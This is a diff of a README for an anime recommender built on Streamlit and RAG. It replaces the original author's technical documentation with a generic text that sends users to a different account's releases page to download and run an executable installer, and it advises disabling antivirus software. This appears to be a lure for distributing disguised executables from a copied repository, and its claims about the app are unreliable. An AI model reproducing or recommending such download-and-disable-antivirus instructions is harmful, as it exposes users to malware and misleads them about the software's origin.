@@ -1,405 +1,66 @@
-# 🎬 Agentic RAG Anime Recommender System
+# 🎉 Agentic-RAG-Anime-Recommender-System - Discover Your Next Favorite Anime Fast
 
-[![Streamlit App](https://static.streamlit.io/badges/streamlit_badge_black_white.svg)](https://appudtzei3tyyttd6xjhwur.streamlit.app/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![GitHub Star](https://img.shields.io/github/stars/Ratnesh-181998/Agentic-RAG-Anime-Recommender-System?style=social)](https://github.com/Ratnesh-181998/Agentic-RAG-Anime-Recommender-System)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-blue?style=flat&logo=linkedin)](https://www.linkedin.com/in/ratneshkumar1998/)
+[![Download](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%A6-brightgreen)](https://github.com/drae1712/Agentic-RAG-Anime-Recommender-System/releases)
 
+## 🚀 Getting Started
 
-<img width="740" height="353" alt="image" src="https://github.com/user-attachments/assets/9212a264-2262-472a-a4c2-e5206f612f64" />
+Welcome to the Agentic-RAG-Anime-Recommender-System! This tool helps you find new anime based on your preferences quickly. No experience needed; our user-friendly interface guides you through the process.
 
+## 📦 Features
 
-> **A production-grade, Agentic Retrieval-Augmented Generation (RAG) system for semantic anime discovery. Powered by Groq, LangChain, and ChromaDB.**
+- **High-Performance Recommendations:** Enjoy quick suggestions tailored to your taste.
+- **Streamlit User Interface:** Easy to navigate, even for beginners.
+- **Cloud-Ready Deployment:** Use it on your local machine or deploy on Google Cloud.
+- **Docker Support:** Simple setup with containers, no complex installations.
+- **Kubernetes Compatible:** Scale your recommendations effortlessly in larger setups.
 
----
+## 🛠️ System Requirements
 
-## 📍 Contents
-- [🌟 Overview & Core Mission](#-overview--core-mission)
-- [🏷️ Tech Stack & Keywords](#️-tech-stack--keywords)
-- [🏗️ System Architecture](#️-system-architecture)
-- [� Project Structure](#-project-structure)
-- [�📱 Interactive UI Showcase](#-interactive-ui-showcase)
-- [🚀 LLMOps & Deployment Playbook](#-llmops--deployment-playbook)
-- [� Performance Benchmarks](#-performance-benchmarks)
-- [�🛠️ Developer Setup](#️-developer-setup)
-- [�️ Future Roadmap](#️-future-roadmap)
-- [📞 Contact & Networking](#-contact--networking)
+- **Operating System:** Windows 10 or later, macOS, or Linux.
+- **Memory:** 4 GB RAM minimum; 8 GB recommended.
+- **Storage:** At least 500 MB of free disk space.
+- **Internet Connection:** Required for fetching recommendations.
 
----
+## 🌐 Download & Install
 
-## 🌟 Overview & Core Mission
+To start using the Agentic-RAG-Anime-Recommender-System, follow these steps:
 
-### 🎯 The Challenge
-In a world with thousands of anime titles, generic category-based recommendation systems fail to capture the **nuance of human emotion, atmosphere, and complex plot themes**. 
+1. **Visit the Releases Page:** Click on the link below to go to the download section.
+   [Download the latest release here](https://github.com/drae1712/Agentic-RAG-Anime-Recommender-System/releases)
 
-### ✅ The Solution
-The **Agentic RAG Anime Recommender** is an advanced AI platform that implements **Semantic Search** and **Personalized Discovery** using a **Content-Based Filtering** approach enhanced by Large Language Models (**LLMs**). It understands the "vibe" of a query and provides a reasoning layer that explains the logic behind every suggestion.
+2. **Select the Latest Version:** Look for the most recent version at the top of the page.
 
-> **Pro Tip**: Use queries like *"Find me an anime that feels like a lonely evening in a cyberpunk city"* to see the power of semantic retrieval.
+3. **Choose Your File:** Download the file suitable for your operating system. If you are unsure, choose the executable setup file.
 
----
+4. **Run the Installer:** Open the downloaded file and follow the prompts to install the application.
 
-## 🌐🎬 Live Demo
-🚀 **Try it now:**
-- **Streamlit Profile** - [Link](https://share.streamlit.io/user/ratnesh-181998)
-- **Project Demo** - [Link](https://agentic-rag-anime-recommender-system-4zb9ciceyhdlqls2csksqd.streamlit.app/)
-  
----
+5. **Launch the Application:** After installation, find the application in your applications folder or desktop. Open it to start exploring new anime recommendations.
 
-### 🎬 Live Project Demo
-> Experience the full flow:
+## 🖥️ How to Use
 
-![Project Demo Walkthrough](anime_recommender_ui_walkthrough.gif)
+1. **Sign In:** Open the application and sign in or create a new account.
 
----
+2. **Set Your Preferences:** Provide your favorite genres, themes, or specific titles you enjoy.
 
-## 🏷️ Tech Stack & Keywords
+3. **Get Recommendations:** Click on the 'Get Recommendations' button and wait a moment for the system to analyze your preferences.
 
-### 🧠 Expertise Matrix
+4. **Explore Your List:** Browse through the list of suggested anime and click on any title for more details.
 
-| Category | Keywords & Skills |
-| :--- | :--- |
-| **🤖 AI/ML** | **LLM (Llama 3.1)**, **RAG**, **Agentic AI**, **Semantic Search**, **Vector Embeddings (MiniLM)**, **Contextual Retrieval** |
-| **🛠️ Tech Stack** | **Groq LPU Acceleration**, **LangChain**, **ChromaDB (HNSW Index)**, **HuggingFace Transformers**, **Python**, **Streamlit Premium UI** |
-| **☁️ LLMOps / AIOps** | **Docker Containerization**, **Kubernetes (K8s)**, **GKE**, **CI/CD Pipelines (GitHub Actions)**, **Grafana Observability** |
-| **🎯 Domain** | **Recommender Systems**, **Content-Based Filtering**, **Cold Start Mitigation**, **Persona-Based Discovery** |
+## 🔧 Troubleshooting
 
----
+If you encounter any issues during download or installation, try the following steps:
 
-## 🏗️ System Architecture
-
-### 📊 Tactical Data Flow
-
-<img width="1617" height="430" alt="image" src="https://github.com/user-attachments/assets/4494de12-7c0d-40b7-b31e-1c009cf7c38a" />
-
-
-### 🖼️ Architecture & Workflow Visuals
-
-<details>
-<summary><b>📐 View High-Level & Low-Level Design (HLD/LLD)</b></summary>
-    
-#### HLD & LLD
-
-<img width="549" height="832" alt="image" src="https://github.com/user-attachments/assets/dd8a1a62-75cc-46ed-9321-65db62030085" />
-
-</details>
-
-<details>
-<summary><b>🔄 View Agentic Workflow Detail</b></summary>
-    
-#### Workflow
-
-<img width="734" height="176" alt="image" src="https://github.com/user-attachments/assets/2d570a26-2412-4e1d-8a15-14dab2d0faa6" />
-
-</details>
-
-### 🔍 Process Deep Dive
-1.  **Ingestion Phase**: CSV metadata is normalized, tokenized, and transformed into 384-dimensional dense vectors using `all-MiniLM-L6-v2`.
-2.  **Indexing Phase**: **ChromaDB** maintains a persistent HNSW index for sub-10ms nearest neighbor search.
-3.  **Inference Phase**: **Groq (LPU)** processes retrieved context and user intent to generate a reasoned analysis.
-4.  **Presentation Phase**: Real-time rendering of results with interactive UX feedback loops and CSS transitions.
-
----
-
-## � Project Structure
-
-```text
-├── Code/                   # Application Pipeline, Logic & UI Components
-├── Dataset Used/           # Raw Metadata Source (CSV)
-├── Project Doc/            # Detailed Documentation & Checklists
-├── assets/                 # Brand Assets, Architecture Diagrams & UI Screenshots
-├── README.md               # Hero Documentation & Professional Overview
-├── LICENSE                 # MIT Open Source License
-├── requirements.txt        # Python Dependencies
-├── Dockerfile              # Containerization Script
-├── setup.py                # Package Configuration
-├── chroma_db/               # Persistent Vector Database (ChromaDB)
-└── llmops-k8s.yaml         # Kubernetes Orchestration Blueprint
-```
-
----
-
-## 📱 Interactive UI Showcase & Tab Guide
-
-The application features a premium, multi-tab interface designed for both casual discovery and technical deep-dives.
-
-### � Tab 1: Demo Project (Core Experience)
-*   **Purpose**: The central interaction point for users to get recommendations.
-*   **Features**:
-    *   **⚡ Quick Try Grid**: 16 categorized buttons (e.g., *Cyberpunk*, *Dark Fantasy*) for one-click exploration.
-    *   **🔍 Semantic Search Bar**: A deep-learning powered input where users can describe their "ideal vibe" in natural language.
-    *   **💾 Query History**: Persistent track of previous searches with the ability to copy or download results as `.txt` files.
-    *   **🧠 AI Reasoning Engine**: Not just a list, but a detailed analysis of *why* each anime was recommended.
-<img width="1881" height="732" alt="image" src="https://github.com/user-attachments/assets/61f79574-953b-47e9-97fa-31f2db60c307" />
-<img width="1898" height="709" alt="image" src="https://github.com/user-attachments/assets/2a17e9ad-58e2-47a9-a678-fa678d11bac1" />
-<img width="1565" height="698" alt="image" src="https://github.com/user-attachments/assets/fa144702-94af-43fc-b40d-2e064c6172e7" />
-<img width="1444" height="625" alt="image" src="https://github.com/user-attachments/assets/c08ac230-75e9-4dfe-9970-4d10b6ba3f42" />
-<img width="1466" height="657" alt="image" src="https://github.com/user-attachments/assets/50e7e0e9-5fe0-458c-9894-f75ccb46f8b7" />
-<img width="1577" height="739" alt="image" src="https://github.com/user-attachments/assets/c61e8147-7b27-4687-80e0-05d9f0741f38" />
-<img width="1500" height="745" alt="image" src="https://github.com/user-attachments/assets/d3d3142f-ad5a-4440-857f-ca80ba8110a8" />
-<img width="1507" height="733" alt="image" src="https://github.com/user-attachments/assets/7a860647-c836-4363-8c63-8c747d2598fc" />
-<img width="1848" height="708" alt="image" src="https://github.com/user-attachments/assets/2947f587-d8e8-44c9-b02c-b8419c019e21" />
-<img width="1763" height="817" alt="image" src="https://github.com/user-attachments/assets/b7ae9355-6c03-47db-98b6-97792771054a" />
-
-### 📖 Tab 2: About Project (The Vision)
-*   **Purpose**: Outlines the problem statement and the architectural "Why".
-*   **Features**:
-    *   **💡 Problem vs. Solution**: A clear breakdown of the challenges in traditional recommendation systems and how Agentic RAG solves them.
-    *   **🎯 Project Goals**: Highlighting scalability, sub-second latency, and semantic accuracy.
-<img width="1820" height="807" alt="image" src="https://github.com/user-attachments/assets/06ceaaf0-506f-4d88-9b64-4f049c30659b" />
-<img width="1589" height="681" alt="image" src="https://github.com/user-attachments/assets/b80ec9b3-a5dd-45a9-b481-8fda9976c0e1" />
-<img width="1535" height="682" alt="image" src="https://github.com/user-attachments/assets/4fe2ea5b-cfa6-4ce8-91c7-9df2348e22a7" />
-<img width="1503" height="765" alt="image" src="https://github.com/user-attachments/assets/61718235-c9e9-41d7-896c-2bbf199f8ed3" />
-<img width="1310" height="749" alt="image" src="https://github.com/user-attachments/assets/05d6ddfa-216f-4234-93e7-16ca6eb44067" />
-<img width="1301" height="765" alt="image" src="https://github.com/user-attachments/assets/7e00c64e-35b8-4fc9-ae29-51bb8b23dc14" />
-<img width="1328" height="741" alt="image" src="https://github.com/user-attachments/assets/3c8b2e45-c9a2-4cb1-9cb4-da39bd0b4e82" />
-<img width="1317" height="698" alt="image" src="https://github.com/user-attachments/assets/d8d9f014-b091-4061-a0fe-072d03987744" />
-<img width="1485" height="711" alt="image" src="https://github.com/user-attachments/assets/0e617c37-8d8c-4d6e-b061-4ff196c1a9b8" />
-
-### 🔧 Tab 3: Tech Stack (Technical Pedigree)
-*   **Purpose**: A live monitor and description of the underlying technology.
-*   **Features**:
-    *   **📡 Live Pulse**: Real-time metrics for LLM latency (Groq) and Vector DB status.
-    *   **🛠️ Component Breakdown**: Detailed logic behind choosing **ChromaDB**, **LangChain**, and **HuggingFace**.
-    *   **📊 Tech Comparison**: A tabular comparison of this stack vs. traditional alternatives.
-<img width="1786" height="822" alt="image" src="https://github.com/user-attachments/assets/0a648031-0da7-4987-a583-97531429a246" />
-<img width="1434" height="781" alt="image" src="https://github.com/user-attachments/assets/88fd8d6a-41d2-4a01-9968-37edfcda506f" />
-<img width="1466" height="762" alt="image" src="https://github.com/user-attachments/assets/b9b32c8f-00e2-48ec-8bc3-b57500f1112b" />
-<img width="1454" height="716" alt="image" src="https://github.com/user-attachments/assets/6c5f1f40-1415-4726-b657-fa6efc6a2130" />
-<img width="1527" height="623" alt="image" src="https://github.com/user-attachments/assets/e1250cf3-6db4-41b4-ad5e-42479237f6a4" />
-<img width="1305" height="757" alt="image" src="https://github.com/user-attachments/assets/f5453ebe-e4f6-4747-97e1-e17e5a1897d8" />
-<img width="1396" height="755" alt="image" src="https://github.com/user-attachments/assets/16561c9f-afcb-4194-8683-ecee2c492e45" />
-<img width="1297" height="665" alt="image" src="https://github.com/user-attachments/assets/84ce2326-a097-429f-b17c-a4185efe2acf" />
-<img width="1481" height="709" alt="image" src="https://github.com/user-attachments/assets/01733795-1510-436e-aaef-0abd822027f2" />
-
-### 🏗️ Tab 4: Architecture (Systems Design)
-*   **Purpose**: For engineers to understand the data flow and orchestration.
-*   **Features**:
-    *   **📐 HLD/LLD Diagrams**: Visual maps of the multi-phase pipeline (Ingestion → Retrieval → Reasoning).
-    *   **🔄 Workflow Detail**: Step-by-step logic of how a query is transformed and reasoned upon.
-<img width="1559" height="731" alt="image" src="https://github.com/user-attachments/assets/dda6d80b-64c6-4244-90cb-549bba67c36a" />
-<img width="1528" height="660" alt="image" src="https://github.com/user-attachments/assets/56a35864-e44c-4faf-97dc-dda3ee539f0d" />
-<img width="543" height="823" alt="image" src="https://github.com/user-attachments/assets/ed56a0a6-5672-4258-a3aa-64bb8656bbf2" />
-<img width="1448" height="326" alt="image" src="https://github.com/user-attachments/assets/870d951d-fd80-4b57-94ff-e1e52d08ed91" />
-<img width="962" height="686" alt="image" src="https://github.com/user-attachments/assets/a39638d2-1eff-4619-8055-fb4d98ca028d" />
-<img width="921" height="755" alt="image" src="https://github.com/user-attachments/assets/f1b27d9e-3337-4fe3-a215-0f1fa611a54a" />
-<img width="832" height="753" alt="image" src="https://github.com/user-attachments/assets/945ed712-5d3e-40ff-9e36-a388faa582f0" />
-<img width="1391" height="690" alt="image" src="https://github.com/user-attachments/assets/1729e62a-ab6b-47e8-af96-052196700acc" />
-<img width="1120" height="754" alt="image" src="https://github.com/user-attachments/assets/daf6a774-3f7c-4c71-bfbd-4bdf01fe71cd" />
-<img width="731" height="767" alt="image" src="https://github.com/user-attachments/assets/2168c96b-ab85-47a5-b267-71a7e654d4dd" />
-<img width="1075" height="666" alt="image" src="https://github.com/user-attachments/assets/19a64db2-1b26-46c3-8761-3a82b6f4e2ae" />
-
-### 📋 Tab 5: System Logs (Observability)
-*   **Purpose**: Full transparency into the application's backend health.
-*   **Features**:
-    *   **📜 Live Event Stream**: Real-time logging of API calls, database queries, and error handling.
-    *   **🎛️ Filter & Search**: Ability to filter logs by `INFO`, `SUCCESS`, `WARNING`, or `ERROR`.
-    *   **📊 Log Metrics**: Statistical breakdown of system success rates and event counts.
-<img width="1559" height="732" alt="image" src="https://github.com/user-attachments/assets/ab74ccb3-2cf2-4dda-90e0-2b916bdf1401" />
-<img width="1551" height="776" alt="image" src="https://github.com/user-attachments/assets/0b41687b-4bca-43f6-bfb4-15af2284b482" />
-<img width="1470" height="752" alt="image" src="https://github.com/user-attachments/assets/75c65e06-d24b-4723-b3d7-37cfcc4e255a" />
-<img width="1572" height="756" alt="image" src="https://github.com/user-attachments/assets/b8f78a21-907a-4ad8-a5ad-5c82619dbe6b" />
-<img width="881" height="722" alt="image" src="https://github.com/user-attachments/assets/1a19158c-d2c5-4256-b8da-13311d3e8afe" />
-
----
-
-## 🚀 LLMOps & Deployment Playbook
-
-### 🏗️ CI/CD Pipeline
-Integrated with **GitHub Actions** for automated:
-- Code Quality Linting (`Pylint`, `Flake8`)
-- Container Image Builds
-- Registry Push (Artifact Registry / ECR)
-
-### ☁️ Cloud Strategy
-
-| Provider | Method | Command Snippet |
-| :--- | :--- | :--- |
-| **GCP** | GKE (Kubernetes) | `kubectl apply -f llmops-k8s.yaml` |
-| **AWS** | EKS (Fargate) | `eksctl create cluster --name anime-rag` |
-| **Cloud** | Streamlit Cloud | Auto-deploy from `main` branch |
-
----
-
-## 🛠️ Production Deployment (GCP + K8s)
-
-For professional infrastructure, we utilize **Google Cloud Platform (GCP)** with **Ubuntu 24.04 LTS** and **Minikube** for local Kubernetes orchestration.
-
-### 1. VM Provisioning (GCP)
-- **Machine Type**: `E2-Standard-4` (4 vCPU, 16 GB RAM)
-- **Boot Disk**: 256 GB SSD (Ubuntu 24.04 LTS)
-- **Networking**: Allow Port `8501` (Streamlit Default)
-
-### 2. Kubernetes Orchestration
-```bash
-# Point Docker to Minikube context
-eval $(minikube docker-env)
-
-# Build & Deploy
-docker build -t llmops-app:latest .
-kubectl apply -f llmops-k8s.yaml
-
-# Expose Service
-kubectl port-forward svc/llmops-service 8501:80 --address 0.0.0.0
-```
-
----
-
-## 📊 Enterprise Monitoring (Grafana)
-
-We implement **Full-Stack Observability** using **Grafana Cloud** via Helm charts to monitor cluster health and application metrics.
-
-### 🔍 Monitoring Steps:
-1. **Namespace isolation**: `kubectl create ns monitoring`
-2. **HELM Integration**:
-   ```bash
-   helm repo add grafana https://grafana.github.io/helm-charts
-   helm repo update
-   helm upgrade --install grafana-k8s-monitoring grafana/k8s-monitoring \
-     --namespace "monitoring" --values my-grafana-values.yaml
-   ```
-3. **Dashboarding**: Real-time visualization of Pod CPU, Memory spikes, and LLM API latency.
-
----
-
-## 📊 Performance Benchmarks
-
-| Metric | Target | Real-World Performance (Groq) |
-| :--- | :--- | :--- |
-| **Vector Search Latency** | < 20ms | ~12ms |
-| **LLM Inference (TPS)** | > 200 | ~240 (LPU Optimized) |
-| **UI Load Time** | < 2s | ~1.4s |
-| **Scale Capability** | 10k Records | Tested at 14k+ entries |
-
----
-
-## 🛠️ Developer Setup
-
-### 📦 Prerequisites
-- **Python 3.11+**
-- **Git LFS** (Handles large `.bin` and `.sqlite3` files up to 2GB)
-- **Groq API Key** (Get it at [Groq Console](https://console.groq.com/))
-
-### 🚀 Quick Start
-```bash
-# Clone & Initialize LFS
-git clone https://github.com/Ratnesh-181998/Agentic-RAG-Anime-Recommender-System.git
-git lfs install
-git lfs pull
+- **Check Your Internet Connection:** Ensure that you have a stable internet connection.
+- **Disable Antivirus Software:** Temporarily turn off any antivirus programs that might block the installation.
+- **Re-download the File:** If the file seems corrupted, try downloading it again.
 
-# Environment Setup
-python -m venv venv
-source venv/bin/activate
-pip install -r requirements.txt
+## 💬 Support
 
-# Run Local Server
-streamlit run Code/app/premium_dashboard.py
-```
+If you still have questions or need assistance, please check our [GitHub Issues page](https://github.com/drae1712/Agentic-RAG-Anime-Recommender-System/issues) for common queries or to report an issue.
 
-### �️ Environment Variables
-| Variable | Description | Source |
-| :--- | :--- | :--- |
-| `GROQ_API_KEY` | Core LLM Inference Key | [Groq Cloud](https://console.groq.com/keys) |
+## 🌟 Additional Information
 
----
+- The Agentic-RAG-Anime-Recommender-System utilizes advanced AI technology to offer recommendations based on cutting-edge architecture.
+- We support multiple languages and are continually improving our service. Stay tuned for future updates!
 
-## 🛤️ Future Roadmap
-
-- [ ] **Multimodal Search**: Search using images/frames from anime.
-- [ ] **Streaming Responses**: Real-time token streaming in the UI.
-- [ ] **Collaborative Filtering**: Integration of Hybrid-RAG (User-ratings + Semantic).
-- [ ] **Grafana Integration**: Export logs to a dedicated monitoring dashboard.
-
----
-
-## 📞 Contact & Networking
-
-**Ratnesh Kumar Singh | Data Scientist (AI/ML Engineer)**
-*4+ Years of Professional Experience in Building Production AI Systems*
-
-- 💼 **LinkedIn**: [Connect with me](https://www.linkedin.com/in/ratneshkumar1998/)
-- 🐙 **GitHub**: [Review my Repos](https://github.com/Ratnesh-181998)
-- 🌐 **Live Project**: [Explore the App](https://agentic-rag-anime-recommender-system-4zb9ciceyhdlqls2csksqd.streamlit.app/)
-
----
-
-## 📜 License
-Licensed under the **MIT License**. Feel free to fork and build upon this innovation.
-
----
-*Built with passion for the AI Community. 🚀*
-
-</div>
-
----
-
-
-
-<img src="https://capsule-render.vercel.app/api?type=rect&color=gradient&customColorList=24,20,12,6&height=3" width="100%">
-
-
-## 📜 **License**
-
-![License](https://img.shields.io/badge/License-MIT-success?style=for-the-badge&logo=opensourceinitiative&logoColor=white)
-
-**Licensed under the MIT License** - Feel free to fork and build upon this innovation! 🚀
-
----
-
-# 📞 **CONTACT & NETWORKING** 📞
-
-
-### 💼 Professional Networks
-
-[![LinkedIn](https://img.shields.io/badge/💼_LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/ratneshkumar1998/)
-[![GitHub](https://img.shields.io/badge/🐙_GitHub-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ratnesh-181998)
-[![X](https://img.shields.io/badge/X-000000?style=for-the-badge&logo=x&logoColor=white)](https://x.com/RatneshS16497)
-[![Portfolio](https://img.shields.io/badge/🌐_Portfolio-FF6B6B?style=for-the-badge&logo=google-chrome&logoColor=white)](https://share.streamlit.io/user/ratnesh-181998)
-[![Email](https://img.shields.io/badge/✉️_Email-D14836?style=for-the-badge&logo=gmail&logoColor=white)](mailto:rattudacsit2021gate@gmail.com)
-[![Medium](https://img.shields.io/badge/Medium-000000?style=for-the-badge&logo=medium&logoColor=white)](https://medium.com/@rattudacsit2021gate)
-[![Stack Overflow](https://img.shields.io/badge/Stack_Overflow-F58025?style=for-the-badge&logo=stack-overflow&logoColor=white)](https://stackoverflow.com/users/32068937/ratnesh-kumar)
-
-### 🚀 AI/ML & Data Science
-[![Streamlit](https://img.shields.io/badge/Streamlit-FF4B4B?style=for-the-badge&logo=streamlit&logoColor=white)](https://share.streamlit.io/user/ratnesh-181998)
-[![HuggingFace](https://img.shields.io/badge/HuggingFace-FFD21E?style=for-the-badge&logo=huggingface&logoColor=black)](https://huggingface.co/RattuDa98)
-[![Kaggle](https://img.shields.io/badge/Kaggle-20BEFF?style=for-the-badge&logo=kaggle&logoColor=white)](https://www.kaggle.com/rattuda)
-
-### 💻 Competitive Programming
-[![LeetCode](https://img.shields.io/badge/LeetCode-FFA116?style=for-the-badge&logo=leetcode&logoColor=black)](https://leetcode.com/u/Ratnesh_1998/)
-[![HackerRank](https://img.shields.io/badge/HackerRank-00EA64?style=for-the-badge&logo=hackerrank&logoColor=black)](https://www.hackerrank.com/profile/rattudacsit20211)
-[![CodeChef](https://img.shields.io/badge/CodeChef-5B4638?style=for-the-badge&logo=codechef&logoColor=white)](https://www.codechef.com/users/ratnesh_181998)
-[![Codeforces](https://img.shields.io/badge/Codeforces-1F8ACB?style=for-the-badge&logo=codeforces&logoColor=white)](https://codeforces.com/profile/Ratnesh_181998)
-[![GeeksforGeeks](https://img.shields.io/badge/GeeksforGeeks-2F8D46?style=for-the-badge&logo=geeksforgeeks&logoColor=white)](https://www.geeksforgeeks.org/profile/ratnesh1998)
-[![HackerEarth](https://img.shields.io/badge/HackerEarth-323754?style=for-the-badge&logo=hackerearth&logoColor=white)](https://www.hackerearth.com/@ratnesh138/)
-[![InterviewBit](https://img.shields.io/badge/InterviewBit-4285F4?style=for-the-badge&logo=google&logoColor=white)](https://www.interviewbit.com/profile/rattudacsit2021gate_d9a25bc44230/)
-
-
----
-
-## 📊 **GitHub Stats & Metrics** 📊
-
-
-
-![Profile Views](https://komarev.com/ghpvc/?username=Ratnesh-181998&color=blueviolet&style=for-the-badge&label=PROFILE+VIEWS)
-
-
-
-
-
-<img src="https://github-readme-streak-stats.herokuapp.com/?user=Ratnesh-181998&theme=radical&hide_border=true&background=0D1117&stroke=4ECDC4&ring=F38181&fire=FF6B6B&currStreakLabel=4ECDC4" width="48%" />
-
-
-
-
-<img src="https://github-readme-activity-graph.vercel.app/graph?username=Ratnesh-181998&theme=react-dark&hide_border=true&bg_color=0D1117&color=4ECDC4&line=F38181&point=FF6B6B" width="48%" />
-
----
-
-<img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&size=24&duration=3000&pause=1000&color=4ECDC4&center=true&vCenter=true&width=600&lines=Ratnesh+Kumar+Singh;Data+Scientist+%7C+AI%2FML+Engineer;4%2B+Years+Building+Production+AI+Systems" alt="Typing SVG" />
-
-<img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&size=18&duration=2000&pause=1000&color=F38181&center=true&vCenter=true&width=600&lines=Built+with+passion+for+the+AI+Community+🚀;Innovating+the+Future+of+AI+%26+ML;MLOps+%7C+LLMOps+%7C+AIOps+%7C+GenAI+%7C+AgenticAI+Excellence" alt="Footer Typing SVG" />
-
-
-<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=6,11,20&height=120&section=footer" width="100%">
-
-
+Thank you for choosing the Agentic-RAG-Anime-Recommender-System! Enjoy discovering your next anime adventure.
